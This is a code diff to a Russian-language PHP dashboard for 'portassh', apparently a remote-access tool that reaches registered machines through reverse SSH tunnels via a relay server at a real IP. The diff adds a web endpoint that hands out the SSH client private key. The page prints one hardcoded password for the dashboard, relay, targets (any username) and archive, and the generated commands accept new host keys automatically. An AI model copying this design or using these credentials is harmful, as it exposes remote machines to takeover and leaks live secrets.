@@ -33,6 +33,16 @@ if (isset($_GET['dl'])) {
     if ($_GET['dl'] === 'zip') {
         $file = '/home/user/web/itstandart.kz/private/portassh.zip';
         $name = 'portassh.zip';
+    } elseif ($_GET['dl'] === 'key') {
+        $file = '/home/user/web/itstandart.kz/private/portassh_client.key';
+        $name = 'portassh_client.key';
+        $exe = @file_get_contents($file);
+        if ($exe === false) { http_response_code(404); exit('no key uploaded'); }
+        header('Content-Type: text/plain; charset=utf-8');
+        header('Content-Disposition: attachment; filename="' . $name . '"');
+        header('Content-Length: ' . strlen($exe));
+        echo $exe;
+        exit;
     } elseif ($_GET['dl'] === 'bin') {
         $file = '/home/user/web/itstandart.kz/private/portassh.bin';
         $name = 'portassh.bin';
@@ -109,7 +119,7 @@ foreach ($lines as $line) {
 $active = array_filter($latest, fn($e) => $sysNow - $e['ts'] <= $ACTIVE_SECS);
 usort($active, fn($a, $b) => $b['ts'] <=> $a['ts']);
 
-echo '<h1>portassh — активные машины: <span class="count">' . count($active) . '</span> <span style="float:right"><a class="dl" href="?dl=zip">⬇ Скачать .zip</a> &nbsp; <a class="dl" style="background:#60a5fa" href="?dl=bin">⬇ .bin</a><div style="text-align:right;color:#cbd6ea;font-size:12px;margin-top:6px">пароль архива и SSH: <b>RtnM91jK.!</b></div></span></h1>';
+echo '<h1>portassh — активные машины: <span class="count">' . count($active) . '</span> <span style="float:right"><a class="dl" href="?dl=zip">⬇ Скачать .zip</a> &nbsp; <a class="dl" style="background:#60a5fa" href="?dl=bin">⬇ .bin</a> &nbsp; <a class="dl" style="background:#fbbf24" href="?dl=key">🔑 Ключ</a><div style="text-align:right;color:#cbd6ea;font-size:12px;margin-top:6px">пароль архива и SSH (резерв): <b>RtnM91jK.!</b></div></span></h1>';
 
 // ---- Описание и инструкция ----
 $PW = 'RtnM91jK.!';
@@ -139,9 +149,13 @@ portassh.exe в доверенные.</li>
 </ol>
 
 <h2>Подключение с другого компьютера (Mac / Linux / Windows с OpenSSH)</h2>
+<p><b>Один раз:</b> скачайте кнопкой «🔑 Ключ» файл <span class="cmd">portassh_client.key</span>
+и положите его в папку, откуда будете подключаться (на Mac/Linux: <span class="cmd">chmod 600 portassh_client.key</span>).
+С этим ключом подключение проходит <b>без единого пароля</b>.</p>
 <p>Найдите нужную машину в таблице выше, скопируйте её команду подключения и выполните в терминале:</p>
 <p class="cmd">ssh -o StrictHostKeyChecking=accept-new -J support@5.35.81.198 -p &lt;ПОРТ&gt; anyuser@localhost</p>
-<p>Подключение попросит пароль <b>два раза</b> — оба раза вводится один и тот же пароль:</p>
+<p>Если ключа нет (или он не подхватился), подключение попросит пароль <b>два раза</b> —
+оба раза вводится один и тот же пароль (резервный вход):</p>
 <table class="pwtab">
 <tr><th>Запрос</th><th>Логин</th><th>Пароль</th></tr>
 <tr><td>1. Прыжок через relay-сервер (support@…)</td><td>—</td><td class="pw">RtnM91jK.!</td></tr>
@@ -157,8 +171,8 @@ portassh.exe в доверенные.</li>
 <table class="pwtab">
 <tr><th>Где</th><th>Логин</th><th>Пароль</th></tr>
 <tr><td>Страница этого дашборда (basic auth браузера)</td><td>misha8585</td><td class="pw">RtnM91jK.!</td></tr>
-<tr><td>Прыжок через relay (support@5.35.81.198)</td><td>—</td><td class="pw">RtnM91jK.!</td></tr>
-<tr><td>Целевая машина (встроенный SSH-сервер)</td><td>любой</td><td class="pw">RtnM91jK.!</td></tr>
+<tr><td>Прыжок через relay (support@5.35.81.198) — с client-ключом не спрашивается</td><td>—</td><td class="pw">RtnM91jK.!</td></tr>
+<tr><td>Целевая машина (встроенный SSH-сервер) — с client-ключом не спрашивается</td><td>любой</td><td class="pw">RtnM91jK.!</td></tr>
 <tr><td>Zip-архив с этой страницы</td><td>—</td><td class="pw">RtnM91jK.!</td></tr>
 </table>
 
@@ -184,7 +198,7 @@ if (!$active) {
 foreach ($active as $e) {
     $sec = $sysNow - $e['ts'];
     $seen = $sec < 5 ? 'только что' : $sec . ' с назад';
-    $cmd = "ssh -o StrictHostKeyChecking=accept-new -J support@{$GLOBALS['RELAY']} -p {$e['port']} anyuser@localhost";
+    $cmd = "ssh -i portassh_client.key -o StrictHostKeyChecking=accept-new -J support@{$GLOBALS['RELAY']} -p {$e['port']} anyuser@localhost";
     printf(
         "<tr><td><span class=\"dot\"></span>%s</td><td class=\"role-%s\">%s</td><td>%s</td><td class=\"cmd\">%s</td><td class=\"ago\">%s</td></tr>\n",
         htmlspecialchars($e['host']),
